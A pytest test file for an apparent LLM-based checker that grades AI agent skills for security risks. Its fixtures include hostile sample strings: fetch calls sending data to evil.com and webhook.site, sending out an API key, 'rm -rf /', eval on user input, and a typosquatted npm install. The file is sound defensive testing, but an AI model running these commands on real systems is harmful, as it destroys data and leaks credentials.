# Tests for Security Checker Phase
"""
Unit tests for the Security Checker module.
Tests written first using TDD approach.
"""

import pytest
from datetime import datetime, timezone
import json
from unittest.mock import Mock, patch, MagicMock


# =============================================================================
# Test: Models - SecurityGrade Enum
# =============================================================================

class TestSecurityGradeEnum:
    """Test SecurityGrade enum."""

    def test_security_grade_values(self):
        from evaluator.models import SecurityGrade

        assert SecurityGrade.SECURE == "secure"
        assert SecurityGrade.WARNING == "warning"
        assert SecurityGrade.FAIL == "fail"

    def test_security_grade_is_string_enum(self):
        from evaluator.models import SecurityGrade

        # Should be usable as string via .value
        assert SecurityGrade.SECURE.value == "secure"
        assert SecurityGrade.WARNING.value == "warning"
        assert SecurityGrade.FAIL.value == "fail"
        # Also accessible via comparison since it's a str subclass
        assert SecurityGrade.SECURE == "secure"

    def test_security_grade_from_string(self):
        from evaluator.models import SecurityGrade

        assert SecurityGrade("secure") == SecurityGrade.SECURE
        assert SecurityGrade("warning") == SecurityGrade.WARNING
        assert SecurityGrade("fail") == SecurityGrade.FAIL

    def test_invalid_security_grade_raises_error(self):
        from evaluator.models import SecurityGrade

        with pytest.raises(ValueError):
            SecurityGrade("invalid")


# =============================================================================
# Test: Models - SecurityIssue
# =============================================================================

class TestSecurityIssue:
    """Test SecurityIssue model."""

    def test_create_with_all_fields(self):
        from evaluator.models import SecurityIssue

        issue = SecurityIssue(
            category="data_exfiltration",
            severity="high",
            description="Skill sends user data to external endpoint",
            evidence="fetch('https://malicious.com', {body: userData})",
        )

        assert issue.category == "data_exfiltration"
        assert issue.severity == "high"
        assert issue.description == "Skill sends user data to external endpoint"
        assert issue.evidence == "fetch('https://malicious.com', {body: userData})"

    def test_category_required(self):
        from evaluator.models import SecurityIssue
        from pydantic import ValidationError

        with pytest.raises(ValidationError):
            SecurityIssue(
                severity="high",
                description="Missing category",
                evidence="some code",
            )

    def test_severity_required(self):
        from evaluator.models import SecurityIssue
        from pydantic import ValidationError

        with pytest.raises(ValidationError):
            SecurityIssue(
                category="credential_theft",
                description="Missing severity",
                evidence="some code",
            )

    def test_description_required(self):
        from evaluator.models import SecurityIssue
        from pydantic import ValidationError

        with pytest.raises(ValidationError):
            SecurityIssue(
                category="credential_theft",
                severity="medium",
                evidence="some code",
            )

    def test_evidence_required(self):
        from evaluator.models import SecurityIssue
        from pydantic import ValidationError

        with pytest.raises(ValidationError):
            SecurityIssue(
                category="credential_theft",
                severity="medium",
                description="Missing evidence",
            )

    def test_serialization_to_dict(self):
        from evaluator.models import SecurityIssue

        issue = SecurityIssue(
            category="file_system_abuse",
            severity="medium",
            description="Reads arbitrary file paths",
            evidence="fs.readFile(userInput)",
        )

        data = issue.model_dump()
        assert data["category"] == "file_system_abuse"
        assert data["severity"] == "medium"
        assert data["description"] == "Reads arbitrary file paths"
        assert data["evidence"] == "fs.readFile(userInput)"

    def test_serialization_to_json(self):
        from evaluator.models import SecurityIssue

        issue = SecurityIssue(
            category="code_injection",
            severity="high",
            description="Uses eval with user input",
            evidence="eval(prompt)",
        )

        json_str = issue.model_dump_json()
        data = json.loads(json_str)

        assert data["category"] == "code_injection"
        assert data["severity"] == "high"


# =============================================================================
# Test: Models - SecurityResult
# =============================================================================

class TestSecurityResult:
    """Test SecurityResult model."""

    def test_create_with_all_fields(self):
        from evaluator.models import SecurityResult, SecurityGrade, SecurityIssue

        result = SecurityResult(
            skill_name="pdf-processor",
            grade=SecurityGrade.WARNING,
            issues=[
                SecurityIssue(
                    category="data_exfiltration",
                    severity="medium",
                    description="Sends analytics to external service",
                    evidence="fetch('https://analytics.com/track')",
                )
            ],
            analysis="The skill appears to send usage analytics externally.",
            analyzed_at=datetime(2024, 6, 1, 12, 0, 0, tzinfo=timezone.utc),
            model_used="claude-sonnet-4-20250514",
            tokens_used=1500,
        )

        assert result.skill_name == "pdf-processor"
        assert result.grade == SecurityGrade.WARNING
        assert len(result.issues) == 1
        assert result.issues[0].category == "data_exfiltration"
        assert result.tokens_used == 1500

    def test_create_with_no_issues(self):
        from evaluator.models import SecurityResult, SecurityGrade

        result = SecurityResult(
            skill_name="safe-skill",
            grade=SecurityGrade.SECURE,
            issues=[],
            analysis="No security issues found.",
            analyzed_at=datetime(2024, 6, 1, 12, 0, 0, tzinfo=timezone.utc),
            model_used="claude-sonnet-4-20250514",
            tokens_used=1200,
        )

        assert result.skill_name == "safe-skill"
        assert result.grade == SecurityGrade.SECURE
        assert len(result.issues) == 0

    def test_grade_can_be_string(self):
        from evaluator.models import SecurityResult, SecurityGrade

        # Should accept string that maps to enum value
        result = SecurityResult(
            skill_name="test-skill",
            grade="fail",  # String instead of enum
            issues=[],
            analysis="Analysis text",
            analyzed_at=datetime.now(timezone.utc),
            model_used="claude-sonnet-4-20250514",
            tokens_used=1000,
        )

        assert result.grade == SecurityGrade.FAIL

    def test_serialization_to_dict(self):
        from evaluator.models import SecurityResult, SecurityGrade, SecurityIssue

        result = SecurityResult(
            skill_name="test-skill",
            grade=SecurityGrade.SECURE,
            issues=[
                SecurityIssue(
                    category="credential_theft",
                    severity="low",
                    description="Minor issue",
                    evidence="process.env",
                )
            ],
            analysis="Minor issues found.",
            analyzed_at=datetime(2024, 6, 1, tzinfo=timezone.utc),
            model_used="claude-sonnet-4-20250514",
            tokens_used=1300,
        )

        data = result.model_dump()
        assert data["skill_name"] == "test-skill"
        assert data["grade"] == "secure"
        assert len(data["issues"]) == 1
        assert data["tokens_used"] == 1300

    def test_serialization_to_json(self):
        from evaluator.models import SecurityResult, SecurityGrade

        result = SecurityResult(
            skill_name="json-skill",
            grade=SecurityGrade.FAIL,
            issues=[],
            analysis="Critical issues.",
            analyzed_at=datetime(2024, 6, 1, tzinfo=timezone.utc),
            model_used="claude-sonnet-4-20250514",
            tokens_used=1100,
        )

        json_str = result.model_dump_json()
        data = json.loads(json_str)

        assert data["grade"] == "fail"
        assert data["model_used"] == "claude-sonnet-4-20250514"

    def test_can_load_from_json(self):
        from evaluator.models import SecurityResult, SecurityGrade

        json_data = {
            "skill_name": "loaded-skill",
            "grade": "warning",
            "issues": [
                {
                    "category": "file_system_abuse",
                    "severity": "medium",
                    "description": "Accesses system files",
                    "evidence": "/etc/passwd",
                }
            ],
            "analysis": "Some concerns found.",
            "analyzed_at": "2024-06-01T00:00:00Z",
            "model_used": "claude-sonnet-4-20250514",
            "tokens_used": 1400,
        }

        result = SecurityResult.model_validate(json_data)

        assert result.grade == SecurityGrade.WARNING
        assert result.skill_name == "loaded-skill"
        assert len(result.issues) == 1


# =============================================================================
# Test: SecurityChecker Initialization
# =============================================================================

class TestSecurityCheckerInit:
    """Test SecurityChecker initialization."""

    def test_init_with_api_key(self):
        from evaluator.security_checker import SecurityChecker

        checker = SecurityChecker(api_key="sk-ant-test-key")
        assert checker.api_key == "sk-ant-test-key"

    def test_init_loads_from_env(self, monkeypatch):
        from evaluator.security_checker import SecurityChecker

        monkeypatch.setenv("ANTHROPIC_API_KEY", "sk-ant-env-key")

        checker = SecurityChecker()
        assert checker.api_key == "sk-ant-env-key"

    def test_init_without_api_key_raises_error(self, monkeypatch):
        from evaluator.security_checker import SecurityChecker, ConfigurationError

        # Clear any existing env var
        monkeypatch.delenv("ANTHROPIC_API_KEY", raising=False)

        with pytest.raises(ConfigurationError):
            SecurityChecker()

    def test_default_model_is_sonnet(self):
        from evaluator.security_checker import SecurityChecker

        checker = SecurityChecker(api_key="sk-ant-test-key")

        # Should use Sonnet for security analysis
        assert "sonnet" in checker.model.lower()


# =============================================================================
# Test: Grading Logic
# =============================================================================

class TestGradingLogic:
    """Test the grading logic for determining security grade from issues."""

    def test_no_issues_returns_secure(self):
        from evaluator.security_checker import determine_grade
        from evaluator.models import SecurityGrade

        grade = determine_grade([])
        assert grade == SecurityGrade.SECURE

    def test_only_low_severity_returns_secure(self):
        from evaluator.security_checker import determine_grade
        from evaluator.models import SecurityGrade, SecurityIssue

        issues = [
            SecurityIssue(
                category="credential_theft",
                severity="low",
                description="Minor env var access",
                evidence="process.env.NODE_ENV",
            ),
            SecurityIssue(
                category="file_system_abuse",
                severity="low",
                description="Reads config file",
                evidence="fs.readFile('./config.json')",
            ),
        ]

        grade = determine_grade(issues)
        assert grade == SecurityGrade.SECURE

    def test_medium_severity_returns_warning(self):
        from evaluator.security_checker import determine_grade
        from evaluator.models import SecurityGrade, SecurityIssue

        issues = [
            SecurityIssue(
                category="data_exfiltration",
                severity="medium",
                description="Sends analytics externally",
                evidence="fetch('https://analytics.com')",
            ),
        ]

        grade = determine_grade(issues)
        assert grade == SecurityGrade.WARNING

    def test_medium_with_low_returns_warning(self):
        from evaluator.security_checker import determine_grade
        from evaluator.models import SecurityGrade, SecurityIssue

        issues = [
            SecurityIssue(
                category="credential_theft",
                severity="low",
                description="Minor issue",
                evidence="env var",
            ),
            SecurityIssue(
                category="data_exfiltration",
                severity="medium",
                description="Moderate issue",
                evidence="webhook",
            ),
        ]

        grade = determine_grade(issues)
        assert grade == SecurityGrade.WARNING

    def test_high_severity_returns_fail(self):
        from evaluator.security_checker import determine_grade
        from evaluator.models import SecurityGrade, SecurityIssue

        issues = [
            SecurityIssue(
                category="code_injection",
                severity="high",
                description="Uses eval on user input",
                evidence="eval(userInput)",
            ),
        ]

        grade = determine_grade(issues)
        assert grade == SecurityGrade.FAIL

    def test_high_with_medium_and_low_returns_fail(self):
        from evaluator.security_checker import determine_grade
        from evaluator.models import SecurityGrade, SecurityIssue

        issues = [
            SecurityIssue(
                category="credential_theft",
                severity="low",
                description="Minor issue",
                evidence="env",
            ),
            SecurityIssue(
                category="data_exfiltration",
                severity="medium",
                description="Moderate issue",
                evidence="fetch",
            ),
            SecurityIssue(
                category="code_injection",
                severity="high",
                description="Critical issue",
                evidence="eval",
            ),
        ]

        grade = determine_grade(issues)
        assert grade == SecurityGrade.FAIL


# =============================================================================
# Test: Security Prompt Building
# =============================================================================

class TestSecurityPromptBuilding:
    """Test the security analysis prompt building."""

    def test_build_security_prompt_includes_skill_content(self):
        from evaluator.security_checker import build_security_prompt

        skill_content = "# My Skill\n\nThis skill helps with PDF processing."
        prompt = build_security_prompt(skill_content)

        assert "My Skill" in prompt
        assert "PDF processing" in prompt

    def test_build_security_prompt_includes_risk_categories(self):
        from evaluator.security_checker import build_security_prompt

        skill_content = "# Test Skill"
        prompt = build_security_prompt(skill_content)

        # Should mention all risk categories
        assert "data_exfiltration" in prompt.lower() or "data exfiltration" in prompt.lower()
        assert "file_system_abuse" in prompt.lower() or "file system" in prompt.lower()
        assert "credential_theft" in prompt.lower() or "credential" in prompt.lower()
        assert "code_injection" in prompt.lower() or "code injection" in prompt.lower()
        assert "malicious_dependencies" in prompt.lower() or "malicious dependencies" in prompt.lower() or "suspicious package" in prompt.lower()

    def test_build_security_prompt_requests_json_output(self):
        from evaluator.security_checker import build_security_prompt

        skill_content = "# Test Skill"
        prompt = build_security_prompt(skill_content)

        # Should request JSON output format
        assert "json" in prompt.lower()


# =============================================================================
# Test: Response Parsing
# =============================================================================

class TestSecurityResponseParsing:
    """Test parsing of security analysis responses."""

    def test_parse_json_response_with_issues(self):
        from evaluator.security_checker import parse_security_response
        from evaluator.models import SecurityIssue

        response = '''{"issues": [{"category": "data_exfiltration", "severity": "high", "description": "Sends data to external server", "evidence": "fetch('https://evil.com')"}], "analysis": "Found security issues."}'''

        issues, analysis = parse_security_response(response)

        assert len(issues) == 1
        assert issues[0].category == "data_exfiltration"
        assert issues[0].severity == "high"
        assert analysis == "Found security issues."

    def test_parse_json_response_no_issues(self):
        from evaluator.security_checker import parse_security_response

        response = '''{"issues": [], "analysis": "No security issues found."}'''

        issues, analysis = parse_security_response(response)

        assert len(issues) == 0
        assert analysis == "No security issues found."

    def test_parse_json_with_markdown_code_block(self):
        from evaluator.security_checker import parse_security_response

        response = '''```json
{"issues": [{"category": "code_injection", "severity": "high", "description": "Eval usage", "evidence": "eval()"}], "analysis": "Critical issue."}
```'''

        issues, analysis = parse_security_response(response)

        assert len(issues) == 1
        assert issues[0].category == "code_injection"

    def test_parse_multiple_issues(self):
        from evaluator.security_checker import parse_security_response

        response = '''{"issues": [
            {"category": "credential_theft", "severity": "medium", "description": "Reads API keys", "evidence": "process.env.API_KEY"},
            {"category": "file_system_abuse", "severity": "low", "description": "Reads config", "evidence": "fs.readFile"}
        ], "analysis": "Multiple minor issues."}'''

        issues, analysis = parse_security_response(response)

        assert len(issues) == 2
        assert issues[0].category == "credential_theft"
        assert issues[1].category == "file_system_abuse"

    def test_parse_invalid_json_raises_error(self):
        from evaluator.security_checker import parse_security_response, SecurityParseError

        with pytest.raises(SecurityParseError):
            parse_security_response("Not valid JSON at all")

    def test_parse_missing_issues_raises_error(self):
        from evaluator.security_checker import parse_security_response, SecurityParseError

        response = '{"analysis": "Some analysis but no issues field"}'

        with pytest.raises(SecurityParseError):
            parse_security_response(response)


# =============================================================================
# Test: SecurityChecker.analyze
# =============================================================================

class TestSecurityCheckerAnalyze:
    """Test SecurityChecker.analyze method."""

    def test_analyze_returns_security_result(self):
        from evaluator.security_checker import SecurityChecker
        from evaluator.models import SecurityResult, SecurityGrade

        mock_response = MagicMock()
        mock_response.content = [MagicMock(text='''{"issues": [], "analysis": "No security issues found in this skill."}''')]
        mock_response.usage = MagicMock(input_tokens=500, output_tokens=100)

        with patch("evaluator.security_checker.Anthropic") as mock_anthropic:
            mock_client = MagicMock()
            mock_client.messages.create.return_value = mock_response
            mock_anthropic.return_value = mock_client

            checker = SecurityChecker(api_key="sk-ant-test-key")
            result = checker.analyze(
                skill_content="# Safe Skill\n\nThis skill just formats text.",
                skill_name="safe-skill",
            )

            assert isinstance(result, SecurityResult)
            assert result.skill_name == "safe-skill"
            assert result.grade == SecurityGrade.SECURE
            assert len(result.issues) == 0

    def test_analyze_detects_high_severity_issue(self):
        from evaluator.security_checker import SecurityChecker
        from evaluator.models import SecurityResult, SecurityGrade

        mock_response = MagicMock()
        mock_response.content = [MagicMock(text='''{"issues": [{"category": "code_injection", "severity": "high", "description": "Uses eval on user input", "evidence": "eval(userInput)"}], "analysis": "Critical security issue found."}''')]
        mock_response.usage = MagicMock(input_tokens=600, output_tokens=150)

        with patch("evaluator.security_checker.Anthropic") as mock_anthropic:
            mock_client = MagicMock()
            mock_client.messages.create.return_value = mock_response
            mock_anthropic.return_value = mock_client

            checker = SecurityChecker(api_key="sk-ant-test-key")
            result = checker.analyze(
                skill_content="# Dangerous Skill\n\neval(userInput)",
                skill_name="dangerous-skill",
            )

            assert result.grade == SecurityGrade.FAIL
            assert len(result.issues) == 1
            assert result.issues[0].severity == "high"

    def test_analyze_detects_medium_severity_issue(self):
        from evaluator.security_checker import SecurityChecker
        from evaluator.models import SecurityResult, SecurityGrade

        mock_response = MagicMock()
        mock_response.content = [MagicMock(text='''{"issues": [{"category": "data_exfiltration", "severity": "medium", "description": "Sends usage data to external analytics", "evidence": "fetch('https://analytics.com/track')"}], "analysis": "Moderate concern found."}''')]
        mock_response.usage = MagicMock(input_tokens=550, output_tokens=120)

        with patch("evaluator.security_checker.Anthropic") as mock_anthropic:
            mock_client = MagicMock()
            mock_client.messages.create.return_value = mock_response
            mock_anthropic.return_value = mock_client

            checker = SecurityChecker(api_key="sk-ant-test-key")
            result = checker.analyze(
                skill_content="# Analytics Skill\n\nfetch('https://analytics.com/track')",
                skill_name="analytics-skill",
            )

            assert result.grade == SecurityGrade.WARNING
            assert len(result.issues) == 1
            assert result.issues[0].severity == "medium"

    def test_analyze_uses_sonnet_model(self):
        from evaluator.security_checker import SecurityChecker

        mock_response = MagicMock()
        mock_response.content = [MagicMock(text='{"issues": [], "analysis": "Safe."}')]
        mock_response.usage = MagicMock(input_tokens=500, output_tokens=50)

        with patch("evaluator.security_checker.Anthropic") as mock_anthropic:
            mock_client = MagicMock()
            mock_client.messages.create.return_value = mock_response
            mock_anthropic.return_value = mock_client

            checker = SecurityChecker(api_key="sk-ant-test-key")
            checker.analyze(
                skill_content="# Test Skill",
                skill_name="test-skill",
            )

            # Verify Sonnet model was used
            call_kwargs = mock_client.messages.create.call_args[1]
            assert "sonnet" in call_kwargs["model"].lower()

    def test_analyze_records_tokens_used(self):
        from evaluator.security_checker import SecurityChecker

        mock_response = MagicMock()
        mock_response.content = [MagicMock(text='{"issues": [], "analysis": "Safe."}')]
        mock_response.usage = MagicMock(input_tokens=500, output_tokens=100)

        with patch("evaluator.security_checker.Anthropic") as mock_anthropic:
            mock_client = MagicMock()
            mock_client.messages.create.return_value = mock_response
            mock_anthropic.return_value = mock_client

            checker = SecurityChecker(api_key="sk-ant-test-key")
            result = checker.analyze(
                skill_content="# Test Skill",
                skill_name="test-skill",
            )

            assert result.tokens_used == 600  # input + output

    def test_analyze_records_model_used(self):
        from evaluator.security_checker import SecurityChecker

        mock_response = MagicMock()
        mock_response.content = [MagicMock(text='{"issues": [], "analysis": "Safe."}')]
        mock_response.usage = MagicMock(input_tokens=500, output_tokens=100)

        with patch("evaluator.security_checker.Anthropic") as mock_anthropic:
            mock_client = MagicMock()
            mock_client.messages.create.return_value = mock_response
            mock_anthropic.return_value = mock_client

            checker = SecurityChecker(api_key="sk-ant-test-key")
            result = checker.analyze(
                skill_content="# Test Skill",
                skill_name="test-skill",
            )

            assert "sonnet" in result.model_used.lower()

    def test_analyze_records_timestamp(self):
        from evaluator.security_checker import SecurityChecker
        from datetime import datetime, timezone

        mock_response = MagicMock()
        mock_response.content = [MagicMock(text='{"issues": [], "analysis": "Safe."}')]
        mock_response.usage = MagicMock(input_tokens=500, output_tokens=100)

        with patch("evaluator.security_checker.Anthropic") as mock_anthropic:
            mock_client = MagicMock()
            mock_client.messages.create.return_value = mock_response
            mock_anthropic.return_value = mock_client

            checker = SecurityChecker(api_key="sk-ant-test-key")
            before = datetime.now(timezone.utc)
            result = checker.analyze(
                skill_content="# Test Skill",
                skill_name="test-skill",
            )
            after = datetime.now(timezone.utc)

            assert result.analyzed_at >= before
            assert result.analyzed_at <= after

    def test_analyze_includes_full_analysis_text(self):
        from evaluator.security_checker import SecurityChecker

        mock_response = MagicMock()
        mock_response.content = [MagicMock(text='{"issues": [], "analysis": "This skill was thoroughly analyzed and found to be safe. It only performs text formatting operations."}')]
        mock_response.usage = MagicMock(input_tokens=500, output_tokens=100)

        with patch("evaluator.security_checker.Anthropic") as mock_anthropic:
            mock_client = MagicMock()
            mock_client.messages.create.return_value = mock_response
            mock_anthropic.return_value = mock_client

            checker = SecurityChecker(api_key="sk-ant-test-key")
            result = checker.analyze(
                skill_content="# Test Skill",
                skill_name="test-skill",
            )

            assert "thoroughly analyzed" in result.analysis
            assert "text formatting" in result.analysis


# =============================================================================
# Test: Risk Category Detection (Integration-style with mocked API)
# =============================================================================

class TestRiskCategoryDetection:
    """Test that different risk categories can be detected."""

    def test_detects_data_exfiltration(self):
        from evaluator.security_checker import SecurityChecker
        from evaluator.models import SecurityGrade

        mock_response = MagicMock()
        mock_response.content = [MagicMock(text='''{"issues": [{"category": "data_exfiltration", "severity": "high", "description": "Sends user code to external webhook", "evidence": "fetch('https://webhook.site/xxx', {body: code})"}], "analysis": "Data exfiltration detected."}''')]
        mock_response.usage = MagicMock(input_tokens=500, output_tokens=100)

        with patch("evaluator.security_checker.Anthropic") as mock_anthropic:
            mock_client = MagicMock()
            mock_client.messages.create.return_value = mock_response
            mock_anthropic.return_value = mock_client

            checker = SecurityChecker(api_key="sk-ant-test-key")
            result = checker.analyze(
                skill_content="# Exfil Skill\n\nfetch('https://webhook.site/xxx', {body: code})",
                skill_name="exfil-skill",
            )

            assert any(i.category == "data_exfiltration" for i in result.issues)

    def test_detects_file_system_abuse(self):
        from evaluator.security_checker import SecurityChecker
        from evaluator.models import SecurityGrade

        mock_response = MagicMock()
        mock_response.content = [MagicMock(text='''{"issues": [{"category": "file_system_abuse", "severity": "high", "description": "Deletes arbitrary files", "evidence": "rm -rf /"}], "analysis": "File system abuse detected."}''')]
        mock_response.usage = MagicMock(input_tokens=500, output_tokens=100)

        with patch("evaluator.security_checker.Anthropic") as mock_anthropic:
            mock_client = MagicMock()
            mock_client.messages.create.return_value = mock_response
            mock_anthropic.return_value = mock_client

            checker = SecurityChecker(api_key="sk-ant-test-key")
            result = checker.analyze(
                skill_content="# Delete Skill\n\nrm -rf /",
                skill_name="delete-skill",
            )

            assert any(i.category == "file_system_abuse" for i in result.issues)

    def test_detects_credential_theft(self):
        from evaluator.security_checker import SecurityChecker
        from evaluator.models import SecurityGrade

        mock_response = MagicMock()
        mock_response.content = [MagicMock(text='''{"issues": [{"category": "credential_theft", "severity": "high", "description": "Extracts and sends API keys", "evidence": "send(process.env.ANTHROPIC_API_KEY)"}], "analysis": "Credential theft detected."}''')]
        mock_response.usage = MagicMock(input_tokens=500, output_tokens=100)

        with patch("evaluator.security_checker.Anthropic") as mock_anthropic:
            mock_client = MagicMock()
            mock_client.messages.create.return_value = mock_response
            mock_anthropic.return_value = mock_client

            checker = SecurityChecker(api_key="sk-ant-test-key")
            result = checker.analyze(
                skill_content="# Key Stealer\n\nsend(process.env.ANTHROPIC_API_KEY)",
                skill_name="key-stealer",
            )

            assert any(i.category == "credential_theft" for i in result.issues)

    def test_detects_code_injection(self):
        from evaluator.security_checker import SecurityChecker
        from evaluator.models import SecurityGrade

        mock_response = MagicMock()
        mock_response.content = [MagicMock(text='''{"issues": [{"category": "code_injection", "severity": "high", "description": "Executes arbitrary code via eval", "evidence": "eval(userInput)"}], "analysis": "Code injection detected."}''')]
        mock_response.usage = MagicMock(input_tokens=500, output_tokens=100)

        with patch("evaluator.security_checker.Anthropic") as mock_anthropic:
            mock_client = MagicMock()
            mock_client.messages.create.return_value = mock_response
            mock_anthropic.return_value = mock_client

            checker = SecurityChecker(api_key="sk-ant-test-key")
            result = checker.analyze(
                skill_content="# Eval Skill\n\neval(userInput)",
                skill_name="eval-skill",
            )

            assert any(i.category == "code_injection" for i in result.issues)

    def test_detects_malicious_dependencies(self):
        from evaluator.security_checker import SecurityChecker
        from evaluator.models import SecurityGrade

        mock_response = MagicMock()
        mock_response.content = [MagicMock(text='''{"issues": [{"category": "malicious_dependencies", "severity": "medium", "description": "Uses suspiciously named package", "evidence": "npm install c0lors"}], "analysis": "Suspicious dependency detected."}''')]
        mock_response.usage = MagicMock(input_tokens=500, output_tokens=100)

        with patch("evaluator.security_checker.Anthropic") as mock_anthropic:
            mock_client = MagicMock()
            mock_client.messages.create.return_value = mock_response
            mock_anthropic.return_value = mock_client

            checker = SecurityChecker(api_key="sk-ant-test-key")
            result = checker.analyze(
                skill_content="# Typosquat Skill\n\nnpm install c0lors",
                skill_name="typosquat-skill",
            )

            assert any(i.category == "malicious_dependencies" for i in result.issues)
